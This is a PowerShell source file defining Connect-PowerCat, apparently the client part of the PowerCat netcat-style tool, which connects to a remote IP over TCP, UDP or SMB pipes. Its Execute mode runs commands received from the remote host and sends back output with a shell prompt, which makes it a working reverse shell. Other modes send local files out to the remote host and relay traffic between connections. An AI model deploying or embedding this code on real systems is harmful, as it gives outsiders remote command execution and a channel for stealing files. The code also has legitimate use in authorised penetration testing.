function Connect-PowerCat {
[CmdletBinding(DefaultParameterSetName = 'Console')]
    Param (
        [Parameter(Position = 0)]
        [Alias('m')]
        [ValidateSet('Smb', 'Tcp', 'Udp')]
        [String]$Mode = 'Tcp',

        [Parameter(Position = 1, Mandatory = $true)]
        [ValidatePattern("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$")]
        [Alias('c')]
        [String]$RemoteIp,
        
        [Parameter(ParameterSetName = 'Execute')]
        [Alias('e')]
        [Switch]$Execute,
        
        [Parameter(ParameterSetName = 'Relay')]
        [Alias('r')]
        [String]$Relay,

        [Parameter(ParameterSetName = 'ReceiveFile')]
        [Alias('rf')]
        [String]$ReceiveFile,
    
        [Parameter(ParameterSetName = 'SendFile')]
        [Alias('sf')]
        [String]$SendFile,
    
        [Parameter()]
        [Alias('d')]
        [Switch]$Disconnect,
    
        [Parameter()]
        [Alias('k')]
        [Switch]$KeepAlive,
    
        [Parameter()]
        [Alias('t')]
        [Int]$Timeout = 60,
        
        [Parameter()]
        [ValidateSet('Ascii','Unicode','UTF7','UTF8','UTF32')]
        [String]$Encoding = 'Ascii'
    )       
    DynamicParam {
        $ParameterDictionary = New-Object Management.Automation.RuntimeDefinedParameterDictionary
        
        if ($Mode -eq 'Smb') { $PipeNameParam = New-RuntimeParameter -Name PipeName -Type String -Mandatory -ParameterDictionary $ParameterDictionary }
        else { $PortParam = New-RuntimeParameter -Name Port -Type Int -Mandatory -Position 1 -ParameterDictionary $ParameterDictionary }

        if ($Execute.IsPresent) { 
            $ScriptBlockParam = New-RuntimeParameter -Name ScriptBlock -Type ScriptBlock -ParameterDictionary $ParameterDictionary 
            $ArgumentListParam = New-RuntimeParameter -Name ArgumentList -Type Object[] -ParameterDictionary $ParameterDictionary 
        }

        return $ParameterDictionary
    }
    Begin {     
        Write-Verbose "Setting up network stream..."

        $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

        switch ($Mode) {
            'Smb' { 
                try { $ClientStream = New-SmbStream $RemoteIp $ParameterDictionary.PipeName.Value -TimeOut $Timeout  }
                catch { Write-Warning "Failed to open Smb stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Tcp' { 
                try { $ClientStream = New-TcpStream $ServerIp $ParameterDictionary.Port.Value -TimeOut $Timeout }
                catch { Write-Warning "Failed to open Tcp stream. $($_.Exception.Message)" ; return }
                continue 
            }
            'Udp' { 
                try { $InitialBytes, $ClientStream = New-UdpStream $ServerIp $ParameterDictionary.Port.Value -TimeOut $Timeout }
                catch { Write-Warning "Failed to open Udp stream. $($_.Exception.Message)" ; return }
            }
        }
            
        switch ($Encoding) {
            'Ascii' { $EncodingType = New-Object Text.AsciiEncoding ; continue }
          'Unicode' { $EncodingType = New-Object Text.UnicodeEncoding ; continue }
             'UTF7' { $EncodingType = New-Object Text.UTF7Encoding ; continue }
             'UTF8' { $EncodingType = New-Object Text.UTF8Encoding ; continue }
            'UTF32' { $EncodingType = New-Object Text.UTF32Encoding ; continue }
        }

        if ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { $FileStream = New-Object IO.FileStream -ArgumentList @($ReceiveFile, [IO.FileMode]::Append) }
      
        if ($PSCmdlet.ParameterSetName -eq 'SendFile') {   
            
            Write-Verbose 'Reading file bytes...'

            if ((Test-Path $SendFile)) { 
            
                if ($Mode -eq 'Smb' -or $Mode -eq 'Udp') { 
                    try { $FileStream = New-Object IO.FileStream -ArgumentList @($SendFile, [IO.FileMode]::Open) }
                    catch { Write-Warning $_.Exception.Message }

                    if ($BytesLeft = $FileStream.Length) {
                    
                        $FileOffset = 0
                        if ($BytesLeft -gt 4608) {

                            $BytesToSend = New-Object Byte[] 4608

                            while ($BytesLeft -gt 4608) {

                                [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                                [void]$FileStream.Read($BytesToSend, 0, 4608)
                            
                                $FileOffset += 4608
                                $BytesLeft -= 4608

                                Write-NetworkStream $Mode $ClientStream $BytesToSend
                            } 

                            $BytesToSend = New-Object Byte[] $BytesLeft
                            [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                            [void]$FileStream.Read($BytesToSend, 0, $BytesLeft)

                            Write-NetworkStream $Mode $ClientStream $BytesToSend
                        }
                        else {
                            $BytesToSend = New-Object Byte[] $BytesLeft
                            [void]$FileStream.Seek($FileOffset, [IO.SeekOrigin]::Begin)
                            [void]$FileStream.Read($BytesToSend, 0, $BytesLeft)

                            Write-NetworkStream $Mode $ClientStream $BytesToSend
                        }
                        $FileStream.Flush()
                        $FileStream.Dispose()
                    }
                    if ($Mode -eq 'Smb') { $ServerStream.Pipe.WaitForPipeDrain() } 
                }
                else { $ClientStream.Socket.SendFile($SendFile) ; sleep 1 }
            }
            else { Write-Warning "$SendFile does not exist." }
        }

        elseif ($PSCmdlet.ParameterSetName -eq 'Relay') {
            
            Write-Verbose "Setting up relay stream..."

            $RelayConfig = $Relay.Split(':')

            if ($RelayConfig.Count -eq 2) { # Listener
                
                $RelayMode = $RelayConfig[0].ToLower()

                switch ($RelayMode) {
                    'smb' { $RelayStream = New-SmbStream -Listener $RelayConfig[1] ; continue }
                    'tcp' { $RelayStream = New-TcpStream -Listener $RelayConfig[1] ; continue }
                    'udp' { $RelayStream = New-UdpStream -Listener $RelayConfig[1] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            elseif ($RelayConfig.Count -eq 3) { # Client
                
                $RelayMode = $RelayConfig[0].ToLower()
                $ServerIp = [Net.IPAddress]::Parse($RemoteIp)

                switch ($RelayMode) {
                    'smb' { $RelayStream = New-SmbStream $RelayConfig[1] $RelayConfig[2] ; continue }
                    'tcp' { $RelayStream = New-TcpStream $ServerIp $RelayConfig[2] ; continue }
                    'udp' { $RelayStream = New-UdpStream $ServerIp $RelayConfig[2] ; continue }
                    default { Write-Warning 'Invalid relay mode specified.' ; return }
                }
            }
            else { Write-Error 'Invalid relay format.' -ErrorAction Stop }
        }
          
        elseif ($ParameterDictionary.ScriptBlock.Value) {
            
            Write-Verbose 'Executing scriptblock...'

            $ScriptBlock = $ParameterDictionary.ScriptBlock.Value
            
            $Error.Clear()
            
            $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke($ParameterDictionary.ArgumentList.Value) | Out-String))
            if ($Error) { foreach ($Err in $Error) { $BytesToSend += $EncodingType.GetBytes($Err.ToString()) } }
            $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
            
            Write-NetworkStream $Mode $ClientStream $BytesToSend
            $ScriptBlock = $null
            $BytesToSend = $null
        }
    }
    Process {             
        [console]::TreatControlCAsInput = $true

        while ($true) {
        
            if ($PSCmdlet.ParameterSetName -eq 'SendFile') { Write-Verbose "$SendFile sent." ; break }
            if ($Disconnect.IsPresent) { Write-Verbose 'Disconnect specified, exiting.' ; break }
            
            # Catch Esc / Read-Host
            if ([console]::KeyAvailable) {          
                $Key = [console]::ReadKey()
                if ($Key.Key -eq [Consolekey]::Escape) {
                    Write-Warning 'Caught escape sequence, stopping PowerCat.'
                    break
                }
                if ($PSCmdlet.ParameterSetName -eq 'Console') { 
                    $BytesToSend = $EncodingType.GetBytes($Key.KeyChar + (Read-Host) + "`n") 
                    Write-NetworkStream $Mode $ClientStream $BytesToSend
                }
            }

            # Get data from the network
            if ($InitialBytes) { $ReceivedBytes = $InitialBytes ; $InitialBytes = $null }
            elseif ($ClientStream.Socket.Connected) { 
                if ($ClientStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ClientStream $ClientStream.Socket.Available } 
                else { Start-Sleep -Milliseconds 1 ; continue }
            }
            elseif ($ClientStream.Pipe.IsConnected) { 
                if ($ClientStream.Read.IsCompleted) { $ReceivedBytes = Read-NetworkStream $Mode $ClientStream } 
                else { Start-Sleep -Milliseconds 1 ; continue }
            }
            else { Write-Warning 'Connection broken, exiting.' ; break }

            # Redirect received bytes
            if ($PSCmdlet.ParameterSetName -eq 'Execute') {
            
                $ScriptBlock = [ScriptBlock]::Create($EncodingType.GetString($ReceivedBytes))
            
                $Global:Error.Clear()
                
                $BytesToSend += $EncodingType.GetBytes(($ScriptBlock.Invoke() | Out-String))
                foreach ($Err in $Global:Error) { $BytesToSend += $EncodingType.GetBytes($Err.Exception.Message) }
                $BytesToSend += $EncodingType.GetBytes(("`nPS $((Get-Location).Path)> "))
                
                Write-NetworkStream $Mode $ClientStream $BytesToSend 
                $BytesToSend = $null
                $ScriptBlock = $null
                continue
            }
            elseif ($PSCmdlet.ParameterSetName -eq 'Relay') { Write-NetworkStream $RelayMode $RelayStream $ReceivedBytes ; continue }
            elseif ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { 
                try { $FileStream.Write($ReceivedBytes, 0, $ReceivedBytes.Length) }
                catch { Write-Verbose $_.Exception.Message ; break } # EOF reached
                continue
            }
            else { 
                try { Write-Host -NoNewline $EncodingType.GetString($ReceivedBytes).TrimEnd("`r") }
                catch { Write-Verbose $_.Exception.Message ; break }
            }
        }
    }
    End {   
        [console]::TreatControlCAsInput = $false
        Write-Verbose 'Attempting to close network stream.'

        if ($PSCmdlet.ParameterSetName -eq 'ReceiveFile') { $FileStream.Flush() ; $FileStream.Dispose() }
      
        try { Close-NetworkStream $Mode $ClientStream }
        catch { Write-Warning "Failed to close client stream. $($_.Exception.Message)" }

        if ($PSCmdlet.ParameterSetName -eq 'Relay') {
            try { Close-NetworkStream $RelayMode $RelayStream }
            catch { Write-Warning "Failed to close relay stream. $($_.Exception.Message)" }
        }
    }
}